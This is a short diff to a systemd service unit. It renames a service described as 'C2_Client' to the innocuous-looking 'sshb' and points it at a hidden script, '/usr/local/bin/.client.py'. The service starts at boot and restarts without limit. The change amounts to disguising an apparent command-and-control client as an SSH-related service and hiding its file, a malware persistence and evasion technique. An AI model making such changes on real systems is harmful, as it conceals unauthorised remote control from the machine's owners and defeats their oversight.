@@ -1,5 +1,5 @@
 [Unit]
-Description=C2_Client
+Description=sshb
 After=network.target
 StartLimitIntervalSec=0
 
@@ -7,7 +7,7 @@ StartLimitIntervalSec=0
 Type=simple
 Restart=always
 RestartSec=1
-ExecStart=python3 /usr/local/bin/client.py
+ExecStart=python3 /usr/local/bin/.client.py
 
 [Install]
 WantedBy=multi-user.target
